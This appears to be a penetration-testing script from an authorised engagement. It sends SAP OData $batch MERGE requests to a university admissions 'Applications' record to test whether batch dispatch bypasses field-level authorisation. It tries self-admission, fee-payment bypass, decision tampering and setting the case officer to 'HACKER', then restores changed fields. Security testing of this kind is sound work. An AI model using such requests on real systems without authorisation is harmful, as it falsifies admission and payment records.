#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Track F — F1.1 — Batch-path re-test of Sweep-1 privileged fields on
`Applications('000000503432')`.

Sweep 1 direct-path MERGE on these fields returned uniform 403. Now that
`_batch_body` has been patched (commit dfb7693) and batch dispatch is proven
to route to a different SAP handler for HigherEducations (501 direct → 204
batched), the same MERGEs need to be re-run through the batch path. If ANY
inner status is 204 with field_changed=True, that's the finding of the
engagement: batch dispatch bypasses field-level authz on Applications.

Fields tested (same set the brief calls out):
  statusCode = "211"           self-admission
  isAppFeePayed = True         fee bypass
  isPropositionAccepted = True decision tampering
  followUpAdmLetter = "1"      admission-letter forgery flag
  caseAdmin = "HACKER"         assign own case officer

Budget: 5 non-safe batch MERGEs + 5 direct GETs (safe) + up to 5 restore
batches. If all 403-inner, total non-safe = 5. If any 204 lands, up to 10
non-safe total including restores. All restores in a `finally:` block —
even if the loop halts mid-field, whatever was captured as needing-restore
gets reverted before exit.
"""
import argparse
import json
import os
import re
import sys

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
import authz_matrix as m  # uses patched _batch_body from dfb7693

# The privileged fields Sweep 1 direct-tested and got 403 on.
# Each entry: (field_name, payload_value, expected-Sweep-1-baseline (informational))
F1_1_FIELDS = [
    ("statusCode", "211", "'000'"),
    ("isAppFeePayed", True, "False"),
    ("isPropositionAccepted", True, "False"),
    ("followUpAdmLetter", "1", "None"),
    ("caseAdmin", "HACKER", "''"),
]

APP_A = "000000503432"


def batched_merge_field(client, session, field, value, logger, note):
    """Send a $batch with a single-op changeset MERGE'ing one field on
    Applications('<A's app>'). Returns (outer_status, inner_status, raw_text).
    """
    body, boundary = m._batch_body(
        [],
        changeset=[("MERGE", f"Applications('{APP_A}')", {field: value})],
    )
    r = client.request(session, "POST", "$batch", body=body,
                       extra_headers={"Content-Type":
                                      f"multipart/mixed; boundary={boundary}"},
                       note=note)
    inner = None
    inners = m._parse_batch_inner_statuses(r.get("text", ""))
    if inners:
        inner = inners[0]
    logger.log("f1.1", f"Applications('{APP_A}')", "POST $batch", note, r,
               [f"outer={r.get('status')}", f"inner={inner}",
                f"payload={{{field!r}: {value!r}}}"])
    return r.get("status"), inner, r.get("text", "")


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--dry-run", action="store_true")
    ap.add_argument("--min-interval", type=float, default=8.0,
                    help="seconds between requests (default 8)")
    args = ap.parse_args()

    m.MIN_INTERVAL = args.min_interval
    print(f"[cadence] MIN_INTERVAL={m.MIN_INTERVAL}", file=sys.stderr)

    client = m.Client(dry_run=args.dry_run)
    logger = m.MatrixLogger(m.JSONL_PATH, dry_run=args.dry_run, append=True)

    if args.dry_run:
        sessions = {"A": m.Session("A", "dry")}
        sessions["A"].csrf = "<dry>"
    else:
        # F1.1 uses only A's session — B not needed
        client_check = m.Session("A", m.load_cookie_header(m.CREDS_DIR + "/A.cookies"))
        client.fetch_csrf(client_check)
        sessions = {"A": client_check}
    sA = sessions["A"]

    # ----- 1. Baseline read (safe) --------------------------------------
    rA_base = m.read_entity(client, sA, f"Applications('{APP_A}')",
                            logger, "f1.1", "F1.1 baseline read")
    baselines = {f: m.json_field(rA_base.get("text", ""), f) for f, _, _ in F1_1_FIELDS}
    logger.log("f1.1", f"Applications('{APP_A}')", "NOTE", "F1.1 baselines",
               {"status": "n/a", "text": ""},
               [f"baseline_{f}={v!r}" for f, v in baselines.items()])

    # Fields whose write actually changed the underlying value — we MUST
    # restore each in the finally block, even if the loop halts early.
    to_restore = {}  # field -> baseline_value (only for fields that landed)
    verdict_rows = []

    try:
        for field, payload, expected in F1_1_FIELDS:
            note = f"F1.1 batched MERGE {field}={payload!r}"
            outer, inner, _ = batched_merge_field(client, sA, field, payload, logger, note)

            # re-read the whole entity to see what actually happened
            rA = m.read_entity(client, sA, f"Applications('{APP_A}')",
                               logger, "f1.1", f"F1.1 re-read after {field}")
            now = m.json_field(rA.get("text", ""), field)
            baseline = baselines.get(field)
            changed = (now != baseline) and (now == payload)

            flags = [f"outer={outer}", f"inner={inner}",
                     f"baseline={baseline!r}", f"after={now!r}",
                     f"field_changed={changed}"]
            if changed:
                flags.append("ANOMALY_batch_path_authz_bypass_persisted")
                to_restore[field] = baseline
            logger.log("f1.1", f"Applications('{APP_A}')", "COMPARE",
                       f"F1.1 verdict {field}",
                       {"status": "n/a", "text": ""}, flags)
            verdict_rows.append((field, outer, inner, baseline, now, changed))

            # If a Critical write lands, halt IMMEDIATELY — restore happens
            # in finally. The remaining fields aren't tested this round.
            if changed:
                print(f"[HALT] Critical: batch-path bypass on {field}={payload!r} — "
                      f"halting further F1.1 fields for restore + writeup",
                      file=sys.stderr)
                break

    finally:
        # ----- Cleanup — restore any changed field --------------------
        for field, baseline in to_restore.items():
            note = f"F1.1 RESTORE {field}={baseline!r}"
            # baseline may be None (SAP returned nothing) — pass "" as safest
            restore_value = "" if baseline is None else baseline
            outer_r, inner_r, _ = batched_merge_field(
                client, sA, field, restore_value, logger, note)
            rv = m.read_entity(client, sA, f"Applications('{APP_A}')",
                               logger, "f1.1", f"F1.1 verify restore {field}")
            now = m.json_field(rv.get("text", ""), field)
            ok = (now == baseline) or (str(now) == str(baseline))
            logger.log("f1.1", f"Applications('{APP_A}')", "CLEANUP_VERIFY",
                       f"{field} ok={ok}",
                       {"status": "n/a", "text": ""},
                       [f"cleanup_ok={ok}",
                        f"expected={baseline!r}", f"observed={now!r}",
                        f"restore_outer={outer_r}", f"restore_inner={inner_r}"])

    # ----- Summary ---------------------------------------------------------
    print("\n=== F1.1 SUMMARY ===", file=sys.stderr)
    any_hit = False
    for f, outer, inner, base, now, chg in verdict_rows:
        marker = " ⚠ ANOMALY" if chg else ""
        any_hit = any_hit or chg
        print(f"  {f:<24} outer={outer} inner={inner} "
              f"baseline={base!r} → after={now!r} changed={chg}{marker}",
              file=sys.stderr)
    print(f"\n[VERDICT] any_batch_path_bypass={any_hit}", file=sys.stderr)
    return 0 if not any_hit else 1  # non-zero if crown-jewel


if __name__ == "__main__":
    sys.exit(main())
